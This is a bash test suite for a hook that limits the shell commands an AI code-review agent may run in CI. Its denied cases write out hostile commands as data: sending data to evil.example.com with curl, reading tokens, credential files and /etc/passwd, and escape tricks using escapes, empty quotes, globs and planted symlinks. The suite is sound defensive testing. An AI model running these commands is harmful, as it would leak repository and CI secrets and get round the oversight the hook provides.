#!/usr/bin/env bash
# Tests for deny-shell-escapes.sh, the PreToolUse hook on the Bash tool.
#
# Runnable alone:
#   bash .github/claude/deny-shell-escapes.test.sh
#
# Every deny case is a negative control on the permission allowlist: each one is
# a command `settings.json` ALLOWS, because permissions.allow matches a command
# prefix and cannot see a flag or a redirect that comes later. `sort file -o
# out` is admitted by `Bash(sort:*)` and refused by `Bash(sort -o:*)` only when
# the flag is the first argument.
#
# The allow cases matter just as much: a hook that refuses `sort -u file` or
# `git log --oneline` takes the review's own tools away.
set -uo pipefail

if ! command -v jq > /dev/null 2>&1; then
  echo "jq is required for this test (macOS: brew install jq)" >&2
  exit 1
fi

HERE=$(cd "$(dirname "$0")" && pwd)
SCRIPT="${SCRIPT:-$HERE/deny-shell-escapes.sh}"

pass=0
fail=0

# The hook resolves a path argument relative to ITS working directory, so the
# symlink cases below need a case to run in. RUN_DIR is that directory ('.' for
# every other case) and RUN_REVIEW_IN is the $REVIEW_IN the hook reads from its
# own environment (empty everywhere else, which is the CI shape for a step that
# does not set it).
RUN_DIR=''
RUN_REVIEW_IN=''

# run <json payload> -> "<exit code>|<first line of stderr>"
run() {
  local out status
  out=$(cd "${RUN_DIR:-.}" || exit 99; printf '%s' "$1" | REVIEW_IN="$RUN_REVIEW_IN" bash "$SCRIPT" 2>&1 >/dev/null)
  status=$?
  printf '%s|%s' "$status" "$(printf '%s' "$out" | head -1)"
}

bash_payload() { jq -cn --arg c "$1" '{tool_name:"Bash", tool_input:{command:$c}}'; }

allowed() { # allowed <command>
  local r status
  r=$(run "$(bash_payload "$1")")
  status="${r%%|*}"
  if [ "$status" = "0" ]; then
    echo "  PASS: allowed  $1"
    pass=$((pass + 1))
  else
    echo "  FAIL: allowed  $1 (exit $status: ${r#*|})"
    fail=$((fail + 1))
  fi
}

denied() { # denied <command> <substring the reason must carry>
  local r status reason
  r=$(run "$(bash_payload "$1")")
  status="${r%%|*}"
  reason="${r#*|}"
  if [ "$status" = "2" ] && printf '%s' "$reason" | grep -qF "$2"; then
    echo "  PASS: denied   $1"
    pass=$((pass + 1))
  else
    echo "  FAIL: denied   $1 (exit $status, reason '$reason'; wanted exit 2 carrying '$2')"
    fail=$((fail + 1))
  fi
}

echo "== 1. The commands the review actually runs are untouched =="
allowed 'git log --oneline -5'
allowed 'grep -rn foo . | head'
allowed 'rg pattern src'
allowed 'cat a b'
allowed 'sort -u file'
# Word boundaries: these contain the letters but not the commands.
allowed 'grep -rn resort web-ui/src'
allowed 'git log --oneline --format=%h origin/main'
allowed 'jq -r ".files[].path" pr.json'
allowed 'wc -l diff.patch'
allowed 'git diff --stat HEAD~1'
# A pipeline of read-only commands is how the review reads a long file, so the
# pipe rule has to admit every one of these while refusing an unlisted segment.
allowed 'grep -rn foo . | head -20'
allowed 'git log --oneline -5 | cat'
allowed 'rg pattern src | sort | head'
allowed 'git status --short'
# review-prompt.md Step 1.5 runs this command itself, wrapped over two lines
# with a backslash continuation and as one line. A hook that refuses either
# takes the cross-file impact analysis away.
allowed 'grep -rn "SYMBOL_NAME" --include="*.js" --include="*.ts" --include="*.tsx" . \
  | grep -v node_modules | head -20'
allowed 'grep -rn "SYMBOL_NAME" --include="*.js" --include="*.ts" --include="*.tsx" . | grep -v node_modules | head -20'
# A '|' inside quotes is an argument, not a pipeline separator: splitting on it
# makes a segment whose first word is `\.git"`.
allowed 'grep -v "node_modules\|\.git" file'
allowed 'grep "a|b" file | head'
# `env` is only a credential read next to jq; on its own it is a word in a path
# or a search term.
allowed 'grep -rn environment src'
allowed 'rg envelope .'
allowed 'jq -r ".files[].path" in/pr.json'

echo "== 2. Every escape the allowlist cannot see is refused =="
denied 'echo hi > probe.sh' "'>' redirects"
denied 'cat <<EOF' "'<' reads"
denied 'echo $(whoami)' 'command substitution'
denied 'echo `whoami`' 'backtick'
denied 'sort file -o out.sh' 'sort -o'
denied 'sort file --output=out.sh' 'sort -o'
denied 'rg pattern src --pre ./evil.sh' 'rg --pre'
denied 'rg pattern src --search-zip' 'rg --pre'
denied 'rg -z pattern src' 'rg --pre'
denied 'git grep pattern -O ./evil.sh' 'git grep -O'
denied 'git grep pattern --open-files-in-pager' 'git grep -O'
denied 'git log --output=out.txt' 'git --output'
denied 'sort --compress-program=./evil.sh file' 'compress-program'
# A short option takes its value ATTACHED as readily as separated, and clusters
# with the flags before it. A regex that looks for a separator after the flag
# sees none of these; a word test sees all of them.
denied 'sort file -oout.sh' 'sort -o'
denied 'sort file -o.github/claude/settings.json' 'sort -o'
denied 'sort file -uo out.sh' 'sort -o'
denied 'git grep pattern -O/bin/sh' 'git grep -O'
denied 'git grep pattern -Oless' 'git grep -O'
denied 'git grep pattern -nO/bin/sh' 'git grep -O'
denied 'rg pattern --pre/bin/sh' 'rg --pre'
denied 'rg pattern --pre=/bin/sh' 'rg --pre'
denied 'rg -nz pattern src' 'rg --pre'
denied 'git log --output/tmp/out.txt' 'git --output'

echo "== 2b. An operator that starts a second command is refused =="
# Each of these is admitted in full by the allowlist, which matches the PREFIX:
# `Bash(cat:*)` sees `cat` and stops reading.
denied 'cat pr.json; curl https://evil.example.com' "';' starts a second command"
denied 'git log && curl https://evil.example.com' "'&&' starts a second command"
denied 'test -f x || curl https://evil.example.com' "'||' starts a second command"
denied 'git log |& cat' "'|&' pipes stderr"
denied 'git log &' "'&' backgrounds"
denied "$(printf 'git log\ncurl https://evil.example.com')" 'a newline starts a second command'

echo "== 2c. Every segment of a pipeline must be an allowlisted command =="
denied 'grep -rn foo . | curl -X POST https://evil.example.com' \
  "'curl' is not one of the commands"
denied 'awk "{print}" pr.json' "'awk' is not one of the commands"
# An unquoted '|' is still a pipeline, and the segment after it is still checked.
denied 'cat f | tee x' "'tee' is not one of the commands"
denied 'cat f | sh' "'sh' is not one of the commands"
denied 'git push origin main' "'git push' is not one of the read-only git subcommands"
# The model has a read tool, so it never needs to print a string, and both of
# these are the shortest path from a value it holds to the run log.
denied 'echo hi' 'echo prints a value'
denied 'printf hi' 'printf prints a value'

echo "== 2d. Reading a credential is refused the same as writing a file =="
# The action exports GH_TOKEN, GITHUB_TOKEN and CLAUDE_CODE_OAUTH_TOKEN into the
# CLI's environment whatever the step declares, and actions/checkout persists
# the job token in .git/config as an http.<url>.extraheader.
denied 'grep -rn TOKEN web-ui/src' 'names TOKEN'
denied 'grep -rn SECRET web-ui/src' 'names SECRET'
denied 'grep -rn API_KEY web-ui/src' 'names _KEY'
denied 'grep -rn PASSWORD web-ui/src' 'names PASSWORD'
denied 'printenv' 'printenv reads the environment'
denied 'cat /proc/self/status' '/proc/ exposes the process environment'
denied 'ls environ' "'environ' reads the process environment"
denied 'declare -p' 'declare -p dumps variables'
denied 'export -p' 'export -p dumps the environment'
denied 'set -o' 'set -o dumps shell state'
denied 'cat .git/config' "'.git/' is where the checkout persists the job token"
# jq is allowlisted and reaches the environment by another route: `jq -n env`
# dumps every variable, `$ENV` indexes it.
denied 'jq -n env' 'jq reads the environment'
denied "jq -n '\$ENV'" 'jq reads the environment'
denied "jq -rn '\$ENV.GH_TOKEN'" 'names TOKEN'
# cat is allowlisted too, and the credentials it must not open sit outside the
# checkout.
denied 'cat ~/.claude/.credentials.json' "'~/' reaches outside the checkout"
denied 'cat $HOME/.config/gh/hosts.yml' 'reaches outside the checkout'
denied 'cat /home/runner/.config/gh/hosts.yml' "'/home/' reaches outside the checkout"
denied 'cat /root/.claude/.credentials.json' "'/root/' reaches outside the checkout"
# The arms above match LITERAL text, so an expansion that assembles the same
# path out of characters they cannot see has to be refused on its own.
denied 'cat /home*/runner/.cla*ude/.credential*' "'*' is a glob"
denied 'cat ~runner/.credentials.json' "'.credentials' is a credential file"
denied 'ls ~runner/.config/gh' "'~' expands to a home directory"
# A tilde inside a word is not an expansion, and `HEAD~1` is how the review
# names the parent commit.
allowed 'git show HEAD~1 --stat'
denied 'ls {/home,/root}/x' "'{' is a brace expansion"
denied 'cat "$HOME/x"' 'reaches outside the checkout'
denied 'cat $PATH' '$PATH expands a variable'
denied 'cat ${PATH}' '${PATH} expands a variable'
# `.claude/` and `.config/` in the checkout are files under review, not the home
# directory: 64 tracked files under .claude/ that merged PRs change. Every route
# to the home-directory copies is refused above.
allowed 'cat .claude/settings.json'
allowed 'grep -rn foo .claude/skills'
allowed 'ls .config/gh'
# The variables the review's own prompts expand, quoted and bare.
allowed 'cat "$REVIEW_IN/diff.patch"'
allowed 'jq -r ".files[].path" $REVIEW_IN/pr.json'

echo "== 2e. Quotes are read the way bash reads them =="
# A backslash-escaped quote does not close the string. A walker that toggled on
# every quote character desyncs here and hands bash the second command.
denied 'grep "a\"b" f | nl' "'nl' is not one of the commands"
denied 'grep a\"b f | nl' "'nl' is not one of the commands"
# Inside single quotes a '"' is an ordinary character, so this is one command.
allowed "grep 'a\"b' f | head"
allowed "rg 'a|b' src | head"
# A metacharacter inside quotes is an argument; escaped outside quotes it is a
# literal to bash, so it is a literal here too.
allowed 'grep "foo[0-9]" file'
allowed 'grep foo\* f'

echo "== 2f. A rule reads the word bash would build, not the characters typed =="
# bash runs the word list left after quote removal and escape processing, so a
# rule that reads the raw string is defeated by one backslash or one empty
# quote per word: neither command below contains the literal '/home/' or
# '.credentials' the arms match, and both open the same files.
denied 'cat /hom\e/runner/.claud\e/.credential\s.json' 'reaches outside the checkout'
denied 'cat /ho""me/runner/.credentials' 'reaches outside the checkout'
denied 'cat /home/runner/.cre""dentials' 'reaches outside the checkout'
denied 'sort file -o\u\t.sh' 'sort -o'
# Quotes that close and reopen inside a word do not split it: `'"'"'a'"'"'b/x` is the one
# word `ab/x`, and it is an ordinary relative path.
allowed "cat 'a'b/x"
allowed 'cat "we"b-ui/src/main.tsx'

echo "== 2g. Nothing outside the checkout, and nothing that climbs out =="
# The review reads the checkout plus \$REVIEW_IN / \$REVIEW_OUT, which it spells
# as the variable — the hook never sees the expanded path. So an absolute word
# is out of bounds whatever it names, which closes the service-account token and
# every other absolute path at once rather than one arm at a time.
denied 'cat /var/run/secrets/kubernetes.io/serviceaccount/token' 'absolute path'
denied 'git diff --no-index /etc/passwd /dev/null' 'absolute path'
denied 'cat /usr/lib/x' 'absolute path'
denied 'jq -r ".files[].path" /tmp/in/pr.json' 'absolute path'
denied 'cat ../../etc/passwd' "climbs out of the checkout"
denied 'cat $REVIEW_IN/../../x' "climbs out of the checkout"
denied 'cat $REVIEW_IN/../../claude-trusted/review-prompt.md' "climbs out of the checkout"
# /dev/null is the one absolute path a read-only command has a use for.
allowed 'cat /dev/null'
allowed 'diff a.txt b.txt'

echo "== 2h. A relative glob is how a model spells a search =="
# With every absolute word refused, a relative glob can only expand inside the
# checkout, so refusing it bought nothing and cost the review its search.
allowed 'ls web-ui/src/components/*'
allowed 'rg -n "foo" src -g *.ts'
allowed 'grep -rn useEffect web-ui/src/**/*.tsx'
allowed 'ls web-ui/src/components/?ard.tsx'
# A glob in a word that is NOT relative still fails closed: it can assemble a
# path out of characters no literal arm sees.
denied 'cat /home*/runner/.cla*ude/.credential*' "'*' is a glob"
denied 'cat ../*/hosts.yml' "'*' is a glob"

echo "== 2i. Only the two directories the workflow hands the model expand =="
# Everything else the review used to interpolate now arrives as a file under
# \$REVIEW_IN, and two of those variables were attacker-controlled strings.
allowed 'cat "$REVIEW_IN/diff.patch"'
allowed 'jq -r ".files[].path" $REVIEW_IN/pr.json'
denied 'cat $HEAD_SHA' '$HEAD_SHA expands a variable'
denied 'cat $PR_NUMBER' '$PR_NUMBER expands a variable'
denied 'grep -rn x $COMMIT_MSG' '$COMMIT_MSG expands a variable'
denied 'cat $TRIGGER_COMMENT' '$TRIGGER_COMMENT expands a variable'
denied 'sort file -o$COMMIT_MSG' 'sort -o'

echo "== 2j. A word is resolved before it is trusted =="
# The rules read the word the model typed; the kernel reads what it points at.
# A relative word carries nothing for a literal arm to match, and the PR under
# review writes the tree it resolves in, so a committed
# `link-out -> /var/run/secrets/...` turns `cat link-out` into a credential
# read. These cases run with the hook's working directory set to a scratch
# checkout that holds exactly that.
SCRATCH=$(mktemp -d)
trap 'rm -rf "$SCRATCH"' EXIT
mkdir -p "$SCRATCH/checkout/sub" "$SCRATCH/review-in"
: > "$SCRATCH/checkout/inside.txt"
: > "$SCRATCH/checkout/sub/nested.txt"
: > "$SCRATCH/review-in/pr.json"
ln -s inside.txt "$SCRATCH/checkout/link-in"
ln -s /etc/passwd "$SCRATCH/checkout/link-out"
ln -s "$SCRATCH/review-in/pr.json" "$SCRATCH/checkout/link-review"
ln -s .. "$SCRATCH/checkout/sub/up"
# A committed filename that starts with '-'. After a literal '--' the command
# reads it as an operand, so the hook has to as well.
ln -s /etc/passwd "$SCRATCH/checkout/-leak.md"
: > "$SCRATCH/checkout/-plain.md"
# The same tree seen through a glob: bash expands the pattern before the command
# runs, so `assets/notes.md` is refused while `assets/*.md` opens the same file
# through a word that does not contain its name.
mkdir -p "$SCRATCH/checkout/assets" "$SCRATCH/checkout/clean" \
  "$SCRATCH/checkout/docs" "$SCRATCH/checkout/many"
: > "$SCRATCH/checkout/assets/readme.md"
ln -s /etc/passwd "$SCRATCH/checkout/assets/notes.md"
: > "$SCRATCH/checkout/clean/a.md"
: > "$SCRATCH/checkout/clean/b.md"
: > "$SCRATCH/checkout/docs/plain.txt"
ln -s /etc/no-such-file-for-this-test "$SCRATCH/checkout/docs/dead"
# One past the hook's 500-match cap.
for ((i = 0; i < 501; i++)); do : > "$SCRATCH/checkout/many/f$i.txt"; done

RUN_DIR="$SCRATCH/checkout"
RUN_REVIEW_IN="$SCRATCH/review-in"
denied 'cat link-out' 'resolves outside the checkout'
denied 'cat link-out | head' 'resolves outside the checkout'
# The out-of-bounds link does not have to be the last component: `sub/up` is a
# link back to the checkout, and the word carries no '..' for the climb rule.
denied 'cat sub/up/link-out' 'resolves outside the checkout'
# A link that stays inside the checkout is an ordinary file, and so is a plain
# one: refusing either would take the review's own reading away.
allowed 'cat link-in'
allowed 'cat inside.txt'
allowed 'cat sub/nested.txt'
allowed 'grep -rn foo .'
# $REVIEW_IN is handed to the model by the workflow, so a link into it is in
# bounds even though it is outside the checkout root.
allowed 'cat link-review'
# A glob names the same files without spelling any of them, so the pattern is
# expanded and every match is resolved. The '*' form is the one the bot found:
# `cat assets/notes.md` was refused and `cat assets/*.md` was not.
denied 'cat assets/*.md' 'resolves outside the checkout'
denied 'cat assets/*.md | head' 'resolves outside the checkout'
denied 'cat assets/?otes.md' 'resolves outside the checkout'
denied 'cat assets/[n]otes.md' 'resolves outside the checkout'
# A dangling link is denied too: it is followed to the path it names, and that
# path is outside the checkout whether or not anything is there.
denied 'ls docs/*' 'resolves outside the checkout'
# Whole matches in the tree: refusing these would take the review's search away.
allowed 'cat clean/*.md'
allowed 'cat clean/[ab].md'
allowed 'ls clean/?.md'
# A pattern that matches nothing is left to the string rules: bash hands it to
# the command literally, and it opens no file.
allowed 'cat nothing-here-*.md'
# A pathological pattern is not a review command, and every match costs a stat.
denied 'ls many/*' 'expands to 501 paths'
# A glob character that was QUOTED is a literal argument, not a pattern.
allowed 'grep "assets/*.md" inside.txt'
# After a literal '--' every later word in that segment is an OPERAND, not a
# flag: `cat -- -leak.md` opens the same file `cat ./-leak.md` does, so skipping
# it as a '-' word let a committed `-leak.md -> /etc/passwd` be read.
denied 'cat -- -leak.md' 'resolves outside the checkout'
denied 'grep -rn root -- -leak.md' 'resolves outside the checkout'
denied 'head -- -leak.md' 'resolves outside the checkout'
denied 'cat -- -leak.md | head' 'resolves outside the checkout'
# The glob form of the same word, expanded before the command runs.
denied 'cat -- -l*.md' 'resolves outside the checkout'
# A post-'--' operand that resolves in the tree is an ordinary file: refusing it
# would take a legitimate read away.
allowed 'cat -- -plain.md'
allowed 'cat -- ./-plain.md'
allowed 'git diff -- inside.txt'
# Without the '--' the tools themselves read `-leak.md` as flags, so the hook's
# flag skip stands and this stays a pass — no file is opened either way.
allowed 'cat -leak.md'
# Spelled as a path it was always refused, and still is.
denied 'cat ./-leak.md' 'resolves outside the checkout'
RUN_DIR=''
RUN_REVIEW_IN=''

echo "== 2k. The literal value of \$REVIEW_IN is spelled out too =="
# The workflow substitutes the values into the prompts, because the Read tool
# cannot expand a variable, so the model types the absolute path in Bash as
# readily as the variable. The absolute-path rule has to admit that one prefix
# and nothing else.
: > "$SCRATCH/review-in/files.txt"
RUN_REVIEW_IN="$SCRATCH/review-in"
allowed 'wc -l $REVIEW_IN/files.txt'
allowed "wc -l $SCRATCH/review-in/files.txt"
allowed "cat $SCRATCH/review-in/"
# The exemption is a prefix on the word, so the '..' rule still reads the word:
# $REVIEW_IN/../claude-trusted is where the workflow keeps the prompts.
denied "cat $SCRATCH/review-in/../claude-trusted/x" "climbs out of the checkout"
# A sibling temp directory is not the one the workflow handed the model.
denied 'cat /runner/_work/_temp/other/x' 'absolute path'
# ... and with nothing set, nothing is exempted.
RUN_REVIEW_IN=''
denied "cat $SCRATCH/review-in/files.txt" 'absolute path'

echo "== 3. A non-Bash tool payload passes straight through =="
R=$(run '{"tool_name":"Read","tool_input":{"file_path":"a > b"}}')
if [ "${R%%|*}" = "0" ]; then echo "  PASS: Read is not this hook's business"; pass=$((pass + 1));
else echo "  FAIL: Read was blocked (${R})"; fail=$((fail + 1)); fi

R=$(run '{"tool_name":"Grep","tool_input":{"pattern":"$(x)"}}')
if [ "${R%%|*}" = "0" ]; then echo "  PASS: Grep is not this hook's business"; pass=$((pass + 1));
else echo "  FAIL: Grep was blocked (${R})"; fail=$((fail + 1)); fi

echo "== 4. An unreadable payload fails open, not closed =="
# The CLI writes the payload, not the PR. Wedging every Bash call over a
# harness problem would take the review down while the allowlist still holds.
R=$(run 'not json at all')
if [ "${R%%|*}" = "0" ]; then echo "  PASS: garbage stdin does not wedge the session"; pass=$((pass + 1));
else echo "  FAIL: garbage stdin blocked (${R})"; fail=$((fail + 1)); fi

R=$(run '{"tool_name":"Bash","tool_input":{}}')
if [ "${R%%|*}" = "0" ]; then echo "  PASS: a Bash payload with no command is a no-op"; pass=$((pass + 1));
else echo "  FAIL: empty command blocked (${R})"; fail=$((fail + 1)); fi

echo "== 5. settings.json wires the hook the way the CLI documents it =="
# Shape verified 2026-09-02 against the CLI binary (2.1.258): "Hooks use a
# matcher + hooks array. The matcher is a string: a tool name ("Bash") ...
# {"PostToolUse": [{"matcher": "Edit|Write", "hooks": [{"type": "command",
# "command": "echo Done"}]}]}"
S="${SETTINGS:-$HERE/settings.json}"
q() { jq -r "$1" "$S"; }
if [ "$(q '.hooks.PreToolUse | length')" = "1" ]; then echo "  PASS: one PreToolUse entry"; pass=$((pass + 1));
else echo "  FAIL: PreToolUse is not a one-entry array"; fail=$((fail + 1)); fi
if [ "$(q '.hooks.PreToolUse[0].matcher')" = "Bash" ]; then echo "  PASS: matched on the Bash tool"; pass=$((pass + 1));
else echo "  FAIL: matcher is not Bash"; fail=$((fail + 1)); fi
if [ "$(q '.hooks.PreToolUse[0].hooks[0].type')" = "command" ]; then echo "  PASS: type is command"; pass=$((pass + 1));
else echo "  FAIL: type is not command"; fail=$((fail + 1)); fi
# The snapshot copy in CI, the working tree locally: a write into the tree that
# gets past the allowlist cannot disable the hook that is meant to catch it.
if [ "$(q '.hooks.PreToolUse[0].hooks[0].command')" = 'bash "${CLAUDE_HOOK_DIR:-.github/claude}/deny-shell-escapes.sh"' ]; then
  echo "  PASS: it runs this script"; pass=$((pass + 1));
else echo "  FAIL: the command does not run this script"; fail=$((fail + 1)); fi
# The CLI warns "matches no known tool" for a deny rule it does not recognise,
# which would print on every review run.
if [ "$(jq -r '[.permissions.deny[] | select(. == "MultiEdit")] | length' "$S")" = "0" ]; then
  echo "  PASS: MultiEdit is not in the deny list"; pass=$((pass + 1));
else echo "  FAIL: MultiEdit is back in the deny list"; fail=$((fail + 1)); fi
if [ "$(jq -r 'has("disableAllHooks")' "$S")" = "false" ]; then
  echo "  PASS: hooks are not switched off wholesale"; pass=$((pass + 1));
else echo "  FAIL: disableAllHooks would disable this hook too"; fail=$((fail + 1)); fi
# The hook refuses both outright, so an allow entry for either is dead weight
# that reads as permission.
if [ "$(jq -r '[.permissions.allow[] | select(. == "Bash(echo:*)" or . == "Bash(printf:*)")] | length' "$S")" = "0" ]; then
  echo "  PASS: echo and printf are off the allowlist"; pass=$((pass + 1));
else echo "  FAIL: echo or printf is back on the allowlist"; fail=$((fail + 1)); fi
# The Read tool has its own allowlist entry, so the paths it must never open are
# named as deny rules. Rule form verified against origin/main's
# .claude/settings.json:4, which uses `Read(**/.env)`.
if [ "$(jq -r '[.permissions.deny[] | select(. == "Read(.git/**)" or . == "Read(**/.git/**)" or . == "Read(/proc/**)" or . == "Read(~/.gitconfig)" or . == "Read(~/.claude/**)" or . == "Read(~/.config/**)" or . == "Read(/home/**)" or . == "Read(/root/**)")] | length' "$S")" = "8" ]; then
  echo "  PASS: the credential paths are denied to the Read tool"; pass=$((pass + 1));
else echo "  FAIL: a credential path is readable"; fail=$((fail + 1)); fi

# The hook refuses every absolute word but /dev/null to Bash; the Read tool
# needs the same fence spelled as deny rules, since it has a blanket allow.
if [ "$(jq -r '[.permissions.deny[] | select(. == "Read(/var/**)" or . == "Read(/etc/**)" or . == "Read(/run/**)" or . == "Read(/sys/**)" or . == "Read(/usr/**)" or . == "Read(/opt/**)" or . == "Read(/tmp/**)" or . == "Read(/dev/**)")] | length' "$S")" = "8" ]; then
  echo "  PASS: the absolute system paths are denied to the Read tool"; pass=$((pass + 1));
else echo "  FAIL: an absolute system path is readable"; fail=$((fail + 1)); fi

echo
echo "passed: $pass  failed: $fail"
[ "$fail" -eq 0 ]
